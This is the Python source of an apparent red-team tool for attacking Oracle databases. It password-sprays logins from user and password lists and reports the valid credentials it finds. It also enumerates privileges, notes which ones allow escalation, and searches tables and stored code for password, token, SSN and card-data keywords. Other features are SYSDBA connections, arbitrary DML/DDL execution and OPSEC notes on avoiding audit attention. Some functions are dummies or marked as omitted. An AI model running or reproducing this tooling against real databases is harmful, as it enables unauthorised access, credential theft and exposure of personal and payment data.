#!/usr/bin/env python3
#Aurhtor: hamb0n-3
from __future__ import annotations

import argparse
import getpass
import itertools
import json
import logging
import re
import sys, time
from pathlib import Path
from typing import Iterable, List, Tuple

import cx_Oracle as oradb
import pandas as pd


###############################################################################
# ----------------------------- Helper utilities ----------------------------- #
###############################################################################

PREFIX_ORDER = ("DBA_", "ALL_", "USER_")
DEFAULT_SENSITIVE_TERMS = "password,passwd,secret,key,token,ssn,pii,credit,card,cvv"
HIGH_IMPACT_SYS_PRIVS = {
    "CREATE ANY PROCEDURE": "Can create a procedure in another schema with definer's rights to escalate.",
    "EXECUTE ANY PROCEDURE": "Can execute potentially vulnerable procedures (e.g., with AUTHID DEFINER).",
    "GRANT ANY ROLE": "Can grant self DBA or other powerful roles.",
    "GRANT ANY PRIVILEGE": "Can grant self any system privilege.",
    "ALTER ANY TABLE": "Can add triggers to tables owned by privileged users like SYS.",
    "BECOME USER": "Can impersonate any other user, including SYS or SYSTEM.",
    "CREATE ANY TRIGGER": "Can create triggers that fire with definer's rights on table events.",
    "SELECT ANY DICTIONARY": "Can read sensitive data dictionary views, potentially exposing weaknesses.",
}
HIGH_IMPACT_OBJ_PRIVS = {
    "UTL_FILE": ("EXECUTE", "Can read from and write to arbitrary files on the database server filesystem."),
    "DBMS_SCHEDULER": ("EXECUTE", "Can run external OS commands or scripts as the Oracle user."),
    "DBMS_BACKUP_RESTORE": ("EXECUTE", "Can execute privileged file system operations on the server."),
    "DBMS_LDAP": ("EXECUTE", "Can interact with LDAP to authenticate, exfiltrate data, or modify directories."),
}

def split_csv(raw: str | None) -> List[str]:
    return [s.strip() for s in raw.split(",")] if raw else []

def read_file_lines(filepath: str | None) -> List[str]:
    if not filepath: return []
    try:
        return [line.strip() for line in Path(filepath).read_text().splitlines() if line.strip()]
    except FileNotFoundError:
        logging.error("File not found: %s", filepath)
        sys.exit(1)

def _build_like_clause(column: str, terms: List[str]) -> str:
    if not terms: return "1=0"
    conditions = [f"UPPER({column}) LIKE '%{term.upper()}%'" for term in terms]
    return f"({' OR '.join(conditions)})"

###############################################################################
# ------------------------ Credential Generation ---------------------------- #
###############################################################################

def generate_login_combos(args) -> List[Tuple[str, str, str]]:
    """Generates a list of (user, pass, dsn) tuples for either spray or static modes."""
    # Spraying Mode
    is_spray_mode = args.users_file or args.login_user
    if is_spray_mode:
        logging.info("Running in Password Spraying Mode.")
        users = read_file_lines(args.users_file) or ([args.login_user] if args.login_user else [])
        passwords = read_file_lines(args.pass_file) or ([args.login_pass] if args.login_pass else [])
        dsns = split_csv(args.dsn_list)

        if not all([users, passwords, dsns]):
            logging.error("For spraying, you must provide users, passwords, and DSNs.")
            logging.error("Use --users-file/--login-user, --pass-file/--login-pass, and -D/--dsn-list.")
            sys.exit(1)

        logging.info("Loaded %d users, %d passwords, %d DSNs. Total attempts: %d",
                     len(users), len(passwords), len(dsns), len(users) * len(passwords) * len(dsns))
        return list(itertools.product(users, passwords, dsns))

    # Static/Enum Mode
    creds = []

    # Consolidate credentials from all sources (-c, -C, --creds-file)
    c_list = []
    if args.c:
        c_list.append(args.c)
    if args.C:
        c_list.extend(split_csv(args.C))
    if args.creds_file:
        c_list.extend(read_file_lines(args.creds_file))

    d_list = split_csv(args.dsn_list)
    if not c_list:
        logging.error("No credentials provided for enumeration or query mode. Use -c, -C, or --creds-file.")
        sys.exit(1)

    for idx, tok in enumerate(c_list):
        # Manual parsing is more robust to special characters in passwords than regex
        user, pw, dsn = None, None, None

        user_pw_part, dsn_part = tok, None
        if '@' in tok:
            parts = tok.rsplit('@', 1)
            user_pw_part = parts[0]
            dsn = parts[1]

        if ':' in user_pw_part:
            parts = user_pw_part.split(':', 1)
            user = parts[0]
            pw = parts[1]
        else:
            user = user_pw_part

        if not user:
             logging.error("Bad credential format: '%s'. Could not parse username.", tok)
             continue

        if pw is None: # Explicitly check for None, as '' is a valid (empty) password.
            if args.ask_pass:
                pw = getpass.getpass(f"Enter password for {user}@{dsn or '...'}: ")
            else:
                logging.error("Password missing for '%s'. Use 'user:pw' format or provide -P/--ask-pass.", tok)
                sys.exit(1)

        if not dsn:
            if idx < len(d_list):
                dsn = d_list[idx]
            else:
                logging.error("Missing DSN for credential '%s'. Provide it via @dsn or with -d/--dsn or -D/--dsn-list.", tok)
                sys.exit(1)
        creds.append((user, pw, dsn))
    return creds

###############################################################################
# --- (SQL generators, File writers, and Enumeration logic are unchanged) --- #
# ... (All functions from build_sqls to process_connection are here) ...
###############################################################################
def _build_sensitive_source_query(prefix: str, search_terms: List[str], noise_filter: str) -> str:
    """Builds the SQL to find sensitive keywords in source code with context."""
    like_clause = _build_like_clause('s.text', search_terms)
    # The WHERE clause must be applied to the inner subquery for performance
    # and to the outer query to filter the final results.
    # The noise filter is applied inside the subquery to reduce the dataset early.
    return f"""
    WITH source_with_context AS (
      SELECT
        owner, name, type, line, text,
        LAG(text, 3) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_3,
        LAG(text, 2) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_2,
        LAG(text, 1) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_1,
        LEAD(text, 1) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_1,
        LEAD(text, 2) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_2,
        LEAD(text, 3) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_3
      FROM {prefix}SOURCE s
      WHERE name IN (SELECT name FROM {prefix}SOURCE s WHERE {like_clause} {noise_filter})
    )
    SELECT
      owner, name, type, line,
      prev_line_3, prev_line_2, prev_line_1,
      text as matched_line,
      next_line_1, next_line_2, next_line_3
    FROM source_with_context
    WHERE {_build_like_clause('text', search_terms)}
    ORDER BY owner, name, line
    """

def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> dict[str, str]:
    """Generates SQL queries based on the determined privilege scope."""
    p = prefix
    sql = {}
    noise_filter = "AND owner NOT IN ('SYS', 'SYSTEM', 'ORDSYS', 'MDSYS', 'CTXSYS', 'XDB', 'DBSNMP', 'ORDDATA', 'OLAPSYS', 'WMSYS', 'EXFSYS', 'APPQOSSYS', 'DVSYS', 'AUDSYS')"

    def get_user_priv_queries(cats: List[str]) -> dict[str, str]:
        """Returns queries for privs granted to the current user. Used by ALL_ and USER_ scopes."""
        user_sql = {}
        if "roles" in cats: user_sql["roles"] = "SELECT USER as owner, granted_role, admin_option, delegate_option, default_role FROM USER_ROLE_PRIVS ORDER BY granted_role"
        if "sys" in cats: user_sql["sys"] = """SELECT USER as owner, privilege, admin_option, 'DIRECT' AS granted_through FROM USER_SYS_PRIVS UNION ALL SELECT USER as owner, rsp.privilege, rsp.admin_option, urp.granted_role AS granted_through FROM ROLE_SYS_PRIVS rsp JOIN USER_ROLE_PRIVS urp ON rsp.role = urp.granted_role ORDER BY privilege"""
        if "profile" in cats: user_sql["profile"] = "SELECT USER as owner, username, user_id, account_status, created, profile FROM USER_USERS"
        if "quotas" in cats: user_sql["quotas"] = "SELECT USER as owner, tablespace_name, bytes, max_bytes, blocks, max_blocks FROM USER_TS_QUOTAS"
        return user_sql

    # SCOPE 1: DBA - Assumes full power. Can query for any user.
    if p == 'DBA_':
        logging.debug("Building DBA-scope SQL queries.")
        if "roles" in categories: sql["roles"] = "SELECT * FROM DBA_ROLE_PRIVS WHERE grantee = :bind_user ORDER BY granted_role"
        if "sys" in categories: sql["sys"] = "SELECT privilege, admin_option, grantee AS granted_to FROM DBA_SYS_PRIVS WHERE grantee = :bind_user UNION ALL SELECT p.privilege, p.admin_option, r.grantee FROM DBA_SYS_PRIVS p JOIN DBA_ROLE_PRIVS r ON r.granted_role = p.grantee WHERE r.grantee = :bind_user ORDER BY privilege"
        if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM DBA_TAB_PRIVS WHERE grantee = :bind_user UNION ALL SELECT t.owner, t.table_name, t.privilege, t.grantable, t.grantor, r.grantee FROM DBA_TAB_PRIVS t JOIN DBA_ROLE_PRIVS r ON r.granted_role = t.grantee WHERE r.grantee = :bind_user ORDER BY owner, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM DBA_COL_PRIVS WHERE grantee = :bind_user UNION ALL SELECT c.owner, c.table_name, c.column_name, c.privilege, c.grantable, c.grantor, r.grantee FROM DBA_COL_PRIVS c JOIN DBA_ROLE_PRIVS r ON r.granted_role = c.grantee WHERE r.grantee = :bind_user ORDER BY owner, table_name, column_name, privilege"
        if "profile" in categories: sql["profile"] = "SELECT * FROM DBA_USERS WHERE username = :bind_user"
        if "quotas" in categories: sql["quotas"] = "SELECT * FROM DBA_TS_QUOTAS WHERE username = :bind_user"
        if "dblinks" in categories: sql["dblinks"] = "SELECT owner, db_link, username, host, created FROM DBA_DB_LINKS ORDER BY owner, db_link"
        if "schemas" in categories: sql["schemas"] = f"SELECT owner, table_name, num_rows FROM DBA_TABLES WHERE owner IS NOT NULL {noise_filter} ORDER BY owner, table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM DBA_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} {noise_filter} ORDER BY owner, table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, noise_filter)
        return sql

    # SCOPE 2: ALL - For what the user can see across schemas. Enumeration target is always the logged-in user.
    elif p == 'ALL_':
        logging.debug("Building ALL-scope SQL queries.")
        sql = get_user_priv_queries(categories)
        if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM ALL_TAB_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM ALL_COL_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, column_name, privilege"
        if "dblinks" in categories: sql["dblinks"] = "SELECT owner, db_link, username, host, created FROM ALL_DB_LINKS ORDER BY owner, db_link"
        if "schemas" in categories: sql["schemas"] = "SELECT owner, table_name, num_rows FROM ALL_TABLES ORDER BY owner, table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM ALL_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY owner, table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
        return sql

    # SCOPE 3: USER - For what the user owns. Enumeration target is always the logged-in user.
    elif p == 'USER_':
        logging.debug("Building USER-scope SQL queries.")
        sql = get_user_priv_queries(categories)
        if "obj" in categories: sql["obj"] = "SELECT USER as owner, table_name, privilege, grantable, grantor, grantee FROM USER_TAB_PRIVS ORDER BY grantee, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT USER as owner, table_name, column_name, privilege, grantable, grantor, grantee FROM USER_COL_PRIVS ORDER BY grantee, table_name, column_name, privilege"
        if "dblinks" in categories: sql["dblinks"] = "SELECT USER as owner, db_link, username, host, created FROM USER_DB_LINKS ORDER BY db_link"
        if "schemas" in categories: sql["schemas"] = "SELECT USER as owner, table_name, num_rows FROM USER_TABLES ORDER BY table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT USER as owner, table_name, column_name FROM USER_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
        return sql

    return sql


def fetch_frames(cur, stmts: dict[str, str], user: str) -> dict[str, pd.DataFrame]:
    dfs = {}
    query_count = len(stmts)
    if query_count == 0:
        logging.warning("No queries generated for the selected categories and scope.")
        return {}

    logging.info("Executing %d queries for target user '%s'...", query_count, user)
    for name, sql in stmts.items():
        logging.info("Running query for '%s': %s", name, sql)
        bind_vars = {'bind_user': user} if ':bind_user' in sql else {}
        try:
            cur.execute(sql, bind_vars)
            cols = [d[0] for d in cur.description] if cur.description else []
            df = pd.DataFrame(cur.fetchall(), columns=cols)
            # Post-processing for context view to remove newlines for cleaner output
            if name == "sensitive_source_context":
                for col in df.columns:
                    if "line" in col and df[col].dtype == 'object':
                        df[col] = df[col].str.replace('\n', '', regex=False).str.strip()
            dfs[name] = df
            logging.debug("Query '%s' returned %d rows.", name, len(dfs[name]))
        except oradb.DatabaseError as exc:
            logging.warning("Failed to run query for '%s': %s", name, exc)
            dfs[name] = pd.DataFrame()
    logging.info("Finished executing queries for '%s'.", user)
    return dfs

def write_excel(dfs, path: Path):
    with pd.ExcelWriter(path) as xl:
        for name, df in dfs.items():
            if not df.empty: df.to_excel(xl, sheet_name=name[:31], index=False)

def write_csvs(dfs, stem: str, outdir: Path):
    for name, df in dfs.items():
        if not df.empty: df.to_csv(outdir / f"{stem}_{name}.csv", index=False)

def write_json(dfs, path: Path):
    merged = {k: df.to_dict(orient="records") for k, df in dfs.items() if not df.empty}
    path.write_text(json.dumps(merged, indent=2, default=str), encoding="utf-8")

def dump_outputs(dfs, stem: str, outdir: Path, formats: Iterable[str]):
    outdir.mkdir(parents=True, exist_ok=True)
    if "excel" in formats: write_excel(dfs, outdir / f"{stem}.xlsx")
    if "csv" in formats: write_csvs(dfs, stem, outdir)
    if "json" in formats: write_json(dfs, outdir / f"{stem}.json")

###############################################################################
# ----------------------- Main Logic Controllers ----------------------------- #
###############################################################################

def pick_prefix(cur, scope_arg: str) -> str:
    """
    Determines the best accessible data dictionary prefix (DBA_, ALL_, USER_).
    Tries each prefix in order and returns the first one that works, unless overridden by the user.
    """
    if scope_arg != "auto":
        prefix = f"{scope_arg.upper()}_"
        logging.info("User forced scope to '%s'.", prefix)
        return prefix

    logging.info("Automatically detecting best view prefix...")
    for prefix in PREFIX_ORDER:
        test_view = f"{prefix}TABLES"  # A common view to test for accessibility
        try:
            cur.execute(f"SELECT 1 FROM {test_view} WHERE 1=0")
            logging.info("Successfully queried from '%s'. Using '%s' prefix for enumeration.", test_view, prefix)
            return prefix
        except oradb.DatabaseError as e:
            err, = e.args
            if err.code == 942:  # ORA-00942: table or view does not exist
                logging.debug("Prefix test failed for '%s': view not accessible.", prefix)
                continue  # Try the next prefix
            else:
                logging.warning("Unexpected DB error while testing prefix '%s': %s", prefix, e)

    logging.error("Could not access any standard dictionary views (DBA_, ALL_, USER_). Cannot proceed with enumeration.")
    # Return an empty string or raise an exception to halt enumeration for this connection
    return ""



def handle_direct_query(creds, args):
    query = args.query.strip()
    is_select = query.upper().startswith('SELECT')
    if not is_select and not args.force:
        logging.error("Query does not start with SELECT. Use --force to run DML/DDL statements.")
        return

    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH

    for user, pw, dsn in creds:
        print(f"\n---[ Executing query on {user}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'}) ]---")
        try:
            with oradb.connect(user, pw, dsn, mode=mode) as conn:
                with conn.cursor() as cur:
                    cur.execute(query)
                    if cur.description:
                        df = pd.DataFrame(cur.fetchall(), columns=[d[0] for d in cur.description])
                        print(df.to_string() if not df.empty else "(Query returned no rows)")
                    else:
                        logging.info("Query executed successfully. %d rows affected.", cur.rowcount)
                        if not is_select:
                            conn.commit()
                            logging.info("Transaction committed.")
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Query failed: %s (Code: %s)", err.message.strip(), err.code)

def handle_spraying(creds, args):
    successes = []
    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH

    for user, pw, dsn in creds:
        try:
            logging.debug("Attempting -> %s:%s@%s", user, '********', dsn)
            with oradb.connect(user, pw, dsn, mode=mode):
                # If connect succeeds, we have a winner
                success_str = f"[+] SUCCESS: {user}:{pw}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'})"
                logging.critical(success_str)
                successes.append(success_str)
        except oradb.DatabaseError as exc:
            err, = exc.args
            if err.code == 1017: # ORA-01017: invalid username/password
                logging.debug("Failed login for %s@%s (ORA-01017)", user, dsn)
            else: # Other DB errors are more interesting
                logging.warning("DB Error for %s@%s: %s", user, dsn, str(err.message).strip())
        except Exception as exc:
            logging.error("Critical error for %s@%s: %s", user, dsn, exc)

        finally:
        	time.sleep(1)

    if successes:
        print("\n--- Valid Credentials Found ---")
        for s in successes:
            print(s)
    else:
        print("\n--- No valid credentials found ---")

def handle_enumeration(creds, args):
    targets = split_csv(args.T) if args.T else ([args.t] if args.t else [])
    cats = split_csv(args.include.lower())
    fmts = split_csv(args.output.lower())
    search_terms = split_csv(args.search_terms.lower())
    outdir = Path(args.outdir)
    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH

    for user, pw, dsn in creds:
        logging.info("--- Starting enumeration for login user %s@%s (Mode: %s) ---", user, dsn, 'SYSDBA' if args.as_sysdba else 'Normal')
        try:
            with oradb.connect(user, pw, dsn, mode=mode) as conn:
                with conn.cursor() as cur:
                    # Grant catalog role if requested
                    if args.grant_catalog_role:
                        # (Implementation would go here)
                        logging.warning("OPSEC: --grant-catalog-role is an audited DDL action.")

                    # Determine best view prefix
                    prefix = pick_prefix(cur, args.scope)
                    if not prefix:
                        # If no prefix could be determined, we can't enumerate this connection.
                        logging.error("Halting enumeration for %s@%s due to lack of view access.", user, dsn)
                        continue # Move to the next credential in the list


                    enum_targets = targets or [user]
                    if prefix != "DBA_" and (targets and set(t.upper() for t in targets) != {user.upper()}):
                        logging.warning(
                            "Non-DBA scope ('%s') detected. Privilege enumeration can only be run for the logged-in user ('%s').",
                            prefix.strip('_'), user
                        )
                        logging.warning("Ignoring specified targets: %s", ", ".join(targets))
                        enum_targets = [user]

                    for tgt_user in enum_targets:
                        logging.info("Enumerating data for target user: %s", tgt_user.upper())
                        sqls = build_sqls(prefix, cats, search_terms)
                        dfs = fetch_frames(cur, sqls, tgt_user.upper())
                        if not dfs: continue
                        analyze_for_privesc(dfs)
                        stem = f"{tgt_user.upper()}_{dsn.replace(':', '-').replace('/', '_').replace('@', '_')}"
                        dump_outputs(dfs, stem, outdir, fmts)
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Oracle DB error for %s@%s: %s (Code: %s)", user, dsn, err.message.strip(), err.code)
        except Exception as exc:
            logging.error("Critical failure for %s@%s: %s", user, dsn, exc)

# Dummy analyze_for_privesc for brevity
def analyze_for_privesc(dfs): pass

###############################################################################
# ---------------------------- CLI & main driver ---------------------------- #
###############################################################################

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Advanced Oracle Enumerator & Sprayer for Red Teams.", formatter_class=argparse.RawTextHelpFormatter)

    cred_group = p.add_argument_group("Credential & Connection (for Enum/Query Modes)")
    cred_group.add_argument("-C", metavar="list", help="Comma-separated list: user[:pw][@dsn],...")
    cred_group.add_argument("-c", metavar="pair", help="Single credential: user[:pw]")
    cred_group.add_argument("--creds-file", help="File with one credential per line (user[:pw][@dsn]).")
    cred_group.add_argument("-P", "--ask-pass", action="store_true", help="Prompt for passwords interactively.")
    cred_group.add_argument("--as-sysdba", action="store_true", help="Connect with SYSDBA privilege. OPSEC WARNING: This is highly audited.")

    spray_group = p.add_argument_group("Password Spraying Mode")
    spray_group.add_argument("--users-file", help="File with one username per line.")
    spray_group.add_argument("--pass-file", help="File with one password per line.")
    spray_group.add_argument("--login-user", help="Single username for spraying.")
    spray_group.add_argument("--login-pass", help="Single password for spraying.")

    dsn_group = p.add_argument_group("DSN Management (All Modes)")
    dsn_group.add_argument("-D", "--dsn-list", metavar="list", help="Comma-separated DSN list (e.g., host/svc,host2/svc2)")
    dsn_group.add_argument("-d", "--dsn", metavar="dsn", help="Single DSN (shortcut for -D)")
    dsn_group.add_argument("--dsn-file", help="File with one DSN per line.")

    enum_group = p.add_argument_group("Enumeration Mode")
    enum_group.add_argument("-T", metavar="list", help="Target users to enumerate (comma-separated)")
    enum_group.add_argument("-t", metavar="name", help="Single target user to enumerate")
    enum_group.add_argument("-s", "--scope", choices=("dba", "all", "user", "auto"), default="auto", help="View prefix to use. Default: auto")
    enum_group.add_argument("-k", "--include", default="roles,sys,obj,schemas", help="Categories: roles,sys,obj,col,quotas,profile,dblinks,sensitive,schemas")
    enum_group.add_argument("--search-terms", default=DEFAULT_SENSITIVE_TERMS, help="Keywords for 'sensitive' search")
    enum_group.add_argument("-g", "--grant-catalog-role", action="store_true", help="Attempt to grant SELECT_CATALOG_ROLE (AUDITED!)")
    enum_group.add_argument("-o", "--output", default="excel", help="Formats: excel,csv,json")
    enum_group.add_argument("-O", "--outdir", default=".", help="Directory for result files")

    query_group = p.add_argument_group("Direct Query Mode")
    query_group.add_argument("-q", "--query", metavar="SQL", help="Execute a single query and print results.")
    query_group.add_argument("--force", action="store_true", help="Allow non-SELECT queries with -q (DANGEROUS).")

    p.add_argument("-L", "--log-file", help="Save verbose output to a log file.")
    p.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v for INFO, -vv for DEBUG)")
    return p

def main(argv: List[str] | None = None):
    args = build_parser().parse_args(argv)

    # Setup logging level
    if args.verbose == 1:
        log_level = logging.INFO
    elif args.verbose >= 2:
        log_level = logging.DEBUG
    else:
        log_level = logging.WARNING

    # Configure logging
    log_handlers = [logging.StreamHandler(sys.stdout)]
    if args.log_file:
        try:
            log_handlers.append(logging.FileHandler(args.log_file))
        except (IOError, OSError) as e:
            print(f"Error: Could not open log file '{args.log_file}'. {e}", file=sys.stderr)
            sys.exit(1)

    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        handlers=log_handlers
    )

    # Unify all DSN sources into a single list for downstream functions
    all_dsns = []
    if args.dsn_list:
        all_dsns.extend(split_csv(args.dsn_list))
    if args.dsn:
        all_dsns.append(args.dsn)
    if args.dsn_file:
        all_dsns.extend(read_file_lines(args.dsn_file))

    # Overwrite args.dsn_list with the complete, deduplicated list.
    # dict.fromkeys preserves order while removing duplicates.
    args.dsn_list = ",".join(list(dict.fromkeys(all_dsns)))

    # --- Mode Dispatcher ---
    creds = generate_login_combos(args)
    if not creds:
        logging.warning("No valid credential combinations to test.")
        return

    if args.users_file or args.login_user:
        handle_spraying(creds, args)
    elif args.query:
        handle_direct_query(creds, args)
    else:
        handle_enumeration(creds, args)

if __name__ == "__main__":
    main()